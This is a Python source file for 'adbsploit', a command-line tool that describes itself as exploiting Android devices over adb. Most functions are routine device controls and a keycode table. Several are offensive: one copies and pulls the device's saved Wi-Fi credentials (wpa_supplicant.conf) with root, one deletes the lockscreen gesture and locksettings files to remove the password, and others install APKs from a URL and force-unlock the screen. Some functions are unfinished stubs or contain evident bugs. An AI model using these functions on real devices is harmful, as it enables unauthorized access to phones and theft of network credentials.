"""
A tool for exploiting android devices from adb
Usage:
For usage instructions execute the following lines:
>>> python adbsploit.py -help
"""
import os
import sys
import time
import adbutils
import fire
from pyfiglet import Figlet
from rich.console import Console
from rich.table import Table
from colorama import Fore

global_device = "device"


class Utils:

    @staticmethod
    def banner():
        f = Figlet(font='slant')
        print(f.renderText('>_adbsploit'))


class Cli(object):

    def devices(self):
        Utils.banner()
        table = Table()
        table.add_column("Device detected", style="cyan")
        table.add_column("Model", style="magenta")
        table.add_column("Name", style="magenta")
        for d in adbutils.adb.device_list():
            table.add_row(d.serial, d.prop.model, d.prop.name)
        console = Console()
        console.print(table)

    def connect(self, device):
        Utils.banner()
        output = adbutils.adb.connect(device)
        print(output)

    def select(self, device):
        Utils.banner()
        output = adbutils.adb.device(serial=device)
        print("Selected device: " + Fore.GREEN + output.serial)

    def list_forward(self, device='all'):
        Utils.banner()
        table = Table()
        table.add_column("Device", style="cyan")
        table.add_column("Local Port", style="magenta")
        table.add_column("Remote Port", style="magenta")
        if device == 'all':
            # list all forwards
            for item in adbutils.adb.forward_list():
                table.add_row(item.serial, item.local, item.remote)
            console = Console()
            console.print(table)
        else:
            # list only one device forwards
            for item in adbutils.adb.forward_list(device):
                table.add_row(item.serial, item.local, item.remote)
            console = Console()
            console.print(table)

    def forward(self, device, local, remote):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.forward(local, remote)
        print(Fore.GREEN + "The port forward is now active...")

    def wifi(self, device, state):
        Utils.banner()
        d = adbutils.adb.device(device)
        if state == 'on':
            d.shell('svc wifi enable')
            print(Fore.GREEN + 'The wifi is now enabled on the device')
        else:
            d.shell('svc wifi disable')
            print(
                Fore.GREEN + 'The wifi is now disabled on the device. To turn wifi back on, you need to plugged in the device')

    def dumpsys(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(d.shell(device + ' dumpsys'))

    def list_apps(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        apps = d.list_packages()
        table = Table()
        table.add_column("App", style="cyan")
        for a in apps:
            table.add_row(a)
        console = Console()
        console.print(table)

    def wpa_supplicant(self, device):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            d.sync.pull("/sdcard/wpa_supplicant.conf", "wpa_supplicant.conf")
            # d.shell(device + " pull /sdcard/wpa_supplicant.conf "+location)
            print(Fore.GREEN + 'WPA Supplicant exported corerctly')
        except:
            print(Fore.RED + 'An error has been ocurred grabbing the wpa_supplicant')

    def install(self, device, apk):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.install(apk)
            print(Fore.GREEN + 'APK installed successfully')
        except:
            print(Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')

    def install_remote(self, device, url):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.install_remote(url)
            print(Fore.GREEN + 'APK installed successfully')
        except:
            print(Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')

    def uninstall(self, device, app):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.uninstall(app)
            print(Fore.GREEN + 'APK uninstalled successfully')
        except:
            print(
                Fore.RED + 'An error has been occurred uninstalling the APK. Check the package name or the error related')

    def shell(self, device, command):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell(command)

    def shutdown(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell('reboot -p')
        print(Fore.GREEN + 'The device is shutting down...')

    def reboot(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell('reboot')
        print(Fore.GREEN + 'The device is rebooting...')

    def restart_server(self):
        Utils.banner()
        adbutils.adb.server_kill()
        print(Fore.GREEN + 'The server is restarting...')
        adbutils.AdbClient(host="127.0.0.1", port=5037)
        print(Fore.GREEN + 'The server is started...')

    def get_folder(self, device, path, name):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
        d.sync.pull(path, name)

    def logs(self, device, app="all"):
        Utils.banner()
        if app == "all":
            os.system('adb -s ' + device + " logcat ")
        else:
            os.system('adb -s ' + device + " logcat " + "app")

    def start_app(self, device, app, activity='None'):
        Utils.banner()
        d = adbutils.adb.device(device)
        if activity == 'None':
            d.app_start(app)
            print(Fore.GREEN+"The app "+app+" is now starting...")
        else:
            d.app_start(app, activity)
            print(Fore.GREEN + "The app " + app + "with the activity "+activity+ " is now starting...")

    def stop_app(self, device, app):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.app_stop(app)
        print(Fore.GREEN + "The app " + app + " is now stopped...")

    def clear_app(self, device, app):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.app_clear(app)
        print(Fore.GREEN + "The app " + app + " is now clear...")

    def show_ip(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        ip = d.wlan_ip()
        print(ip)

    def extract_app(self, device):
        Utils.banner()


    def battery(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        bat = d.shell("dumpsys battery")
        print(Fore.GREEN+"The battery for device "+device+" is:")
        print(Fore.MAGENTA+bat)

    def netstat(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        bat = d.shell("netstat")
        print(Fore.GREEN + "The netstat for device " + device + " is:")
        print(Fore.MAGENTA + bat)

    def airplane(self, device, status):
        Utils.banner()
        d = adbutils.adb.device(device)
        if status == 'on':
            d.switch_airplane(True)
            print(Fore.GREEN + "The Airplane Mode is activated...")
        elif status == 'off':
            d.switch_airplane(False)
            print(Fore.GREEN + "The Airplane Mode is deactivated...")
        else:
            print(Fore.RED+"The status value only accepts on or off")

    def sound(self, device, type, set):
        Utils.banner()
        d = adbutils.adb.device(device)
        if type == 'media':
            d.shell('media volume --stream 3 --set '+set)
            print(Fore.GREEN+'The media volume is now set to '+set+'...')
        elif type == 'call':
            d.shell('media volume --stream 0 --set ' + set)
            print(Fore.GREEN + 'The call volume is now set to ' + set + '...')
        elif type == 'system':
            d.shell('media volume --stream 1 --set ' + set)
            print(Fore.GREEN + "The system volume is now set to " + set + '...')
        elif type == 'notifications':
            d.shell('media volume --stream 2 --set ' + set)
            print(Fore.GREEN + 'The notifications volume is now set to ' + set + '...')
        elif type == 'all':
            d.shell()
            d.shell('media volume --stream 3 --set ' + set)
            d.shell('media volume --stream 2 --set ' + set)
            d.shell('media volume --stream 1 --set ' + set)
            d.shell('media volume --stream 0 --set ' + set)
            print(Fore.GREEN + 'The all volume types is now set to ' + set + '...')
        else:
            print(Fore.RED + "This type doesn't exists...")


    def keycode(self):
        Utils.banner()

    def current_app(self):
        Utils.banner()

    def send_key(self):
        Utils.banner()

    def check_screen(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        screen = d.is_screen_on()
        if screen == True:
            print(Fore.GREEN+'The screen is on...')
        else:
            print(Fore.GREEN + 'The screen is off...')

    def dump_hierarchy(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(Fore.GREEN + d.dump_hierarchy())

    def keyevent(self, device, key):
        Utils.banner()
        d = adbutils.adb.device(device)
        k = d.keyevent(key)
        print(Fore.GREEN+"They key event is processed correctly...")

    def show_keyevents(self):
        Utils.banner()
        table = Table()
        table.add_column("Code", style="cyan")
        table.add_column("Keycode", style="magenta")
        table.add_row("0", "KEYCODE_UNKNOWN")
        table.add_row("1", "KEYCODE_MENU")
        table.add_row("2", "KEYCODE_SOFT_RIGHT")
        table.add_row("3", "KEYCODE_HOME")
        table.add_row("4", "KEYCODE_BACK")
        table.add_row("5", "KEYCODE_CALL")
        table.add_row("6", "KEYCODE_ENDCALL")
        table.add_row("7", "KEYCODE_0")
        table.add_row("8", "KEYCODE_1")
        table.add_row("9", "KEYCODE_2")
        table.add_row("10", "KEYCODE_3")
        table.add_row("11", "KEYCODE_4")
        table.add_row("12", "KEYCODE_5")
        table.add_row("13", "KEYCODE_6")
        table.add_row("14", "KEYCODE_7")
        table.add_row("15", "KEYCODE_8")
        table.add_row("16", "KEYCODE_9")
        table.add_row("17", "KEYCODE_STAR")
        table.add_row("18", "KEYCODE_POUND")
        table.add_row("19", "KEYCODE_DPAD_UP")
        table.add_row("20", "KEYCODE_DPAD_DOWN")
        table.add_row("21", "KEYCODE_DPAD_LEFT")
        table.add_row("22", "KEYCODE_DPAD_RIGHT")
        table.add_row("23", "KEYCODE_DPAD_CENTER")
        table.add_row("24", "KEYCODE_VOLUME_UP")
        table.add_row("25", "KEYCODE_VOLUME_DOWN")
        table.add_row("26", "KEYCODE_POWER")
        table.add_row("27", "KEYCODE_CAMERA")
        table.add_row("28", "KEYCODE_CLEAR")
        table.add_row("29", "KEYCODE_A")
        table.add_row("30", "KEYCODE_B")
        table.add_row("31", "KEYCODE_C")
        table.add_row("32", "KEYCODE_D")
        table.add_row("33", "KEYCODE_E")
        table.add_row("34", "KEYCODE_F")
        table.add_row("35", "KEYCODE_G")
        table.add_row("36", "KEYCODE_H")
        table.add_row("37", "KEYCODE_I")
        table.add_row("38", "KEYCODE_J")
        table.add_row("39", "KEYCODE_K")
        table.add_row("40", "KEYCODE_L")
        table.add_row("41", "KEYCODE_M")
        table.add_row("42", "KEYCODE_N")
        table.add_row("43", "KEYCODE_O")
        table.add_row("44", "KEYCODE_P")
        table.add_row("45", "KEYCODE_Q")
        table.add_row("46", "KEYCODE_R")
        table.add_row("47", "KEYCODE_S")
        table.add_row("48", "KEYCODE_T")
        table.add_row("49", "KEYCODE_U")
        table.add_row("50", "KEYCODE_V")
        table.add_row("51", "KEYCODE_W")
        table.add_row("52", "KEYCODE_X")
        table.add_row("53", "KEYCODE_Y")
        table.add_row("54", "KEYCODE_Z")
        table.add_row("55", "KEYCODE_COMMA")
        table.add_row("56", "KEYCODE_PERIOD")
        table.add_row("57", "KEYCODE_ALT_LEFT")
        table.add_row("58", "KEYCODE_ALT_RIGHT")
        table.add_row("59", "KEYCODE_SHIFT_LEFT")
        table.add_row("60", "KEYCODE_SHIFT_RIGHT")
        table.add_row("61", "KEYCODE_TAB")
        table.add_row("62", "KEYCODE_SPACE")
        table.add_row("63", "KEYCODE_SYM")
        table.add_row("64", "KEYCODE_EXPLORER")
        table.add_row("65", "KEYCODE_ENVELOPE")
        table.add_row("66", "KEYCODE_ENTER")
        table.add_row("67", "KEYCODE_DEL")
        table.add_row("68", "KEYCODE_GRAVE")
        table.add_row("69", "KEYCODE_MINUS")
        table.add_row("70", "KEYCODE_EQUALS")
        table.add_row("71", "KEYCODE_LEFT_BRACKET")
        table.add_row("72", "KEYCODE_RIGHT_BRACKET")
        table.add_row("73", "KEYCODE_BACKSLASH")
        table.add_row("74", "KEYCODE_SEMICOLON")
        table.add_row("75", "KEYCODE_APOSTROPHE")
        table.add_row("76", "KEYCODE_SLASH")
        table.add_row("77", "KEYCODE_AT")
        table.add_row("78", "KEYCODE_NUM")
        table.add_row("79", "KEYCODE_HEADSETHOOK")
        table.add_row("80", "KEYCODE_FOCUS")
        table.add_row("81", "KEYCODE_PLUS")
        table.add_row("82", "KEYCODE_MENU")
        table.add_row("83", "KEYCODE_NOTIFICATION")
        table.add_row("84", "KEYCODE_SEARCH")
        table.add_row("85", "TAG_LAST_KEYCODE")
        console = Console()
        console.print(table)

    def open_browser(self, device, url):
        Utils.banner()
        d = adbutils.adb.device(device)
        if url != '':
            d.open_browser(url)
            print(Fore.GREEN + 'The url '+url+' is now opening...')
        else:
            print(Fore.RED + 'The URL can not be null...')

    def remove_password(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(Fore.RED + 'Trying to remove lockscreen password...')
        d1 = d.shell("su 0 'rm /data/system/gesture.key'")
        print(d1)
        d2 = d.shell("su 0 'rm /data/system/locksettings.db'")
        print(d2)
        d3 = d.shell("su 0 'rm /data/system/locksettings.db-wal'")
        print(d3)
        d4 = d.shell("su 0 'rm /data/system/locksettings.db-shm'")
        print(d4)

    #TODO
    def rotate(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.rotation()

    #TODO
    def swipe(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.swipe()

    def screen(self, device, status):
        Utils.banner()
        d = adbutils.adb.device(device)
        if status == 'on':
            d.switch_screen(True)
        elif status == 'off':
            d.switch_screen(False)
        else:
            print(Fore.RED+"That option doesn't exists...")

    def unlock_screen(self, device, code):
        Utils.banner()
        d = adbutils.adb.device(device)
        if d.is_screen_on() == False:
            d.switch_screen(True)
            d.swipe(200, 900, 200, 300, 0.5)
            d.shell("input text " + str(code))
            d.keyevent(66)
            print(Fore.GREEN + "The screen is unlocked...")
        else:
            print(Fore.GREEN+"The screen is already unlocked...")

    def show_mac(self):
        Utils.banner()

    def screenrecord(self):
        Utils.banner()

    def stream_screen(self):
        Utils.banner()

    def screenshot(self):
        Utils.banner()

    def get_notifications(self,device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(d.shell("dumpsys notification | grep ticker | cut -d= -f2"))


    def version(self):
        """Show the version of the tool"""
        Utils.banner()
        table = Table()
        table.add_column("Version", style="cyan")
        table.add_column("URL", style="magenta")
        table.add_column("Developed", style="magenta")
        table.add_row('0.1', "https://github.com/mesquidar/adbsploit", 'Ruben Mesquida')
        console = Console()
        console.print(table)


if __name__ == '__main__':
    fire.Fire(Cli)
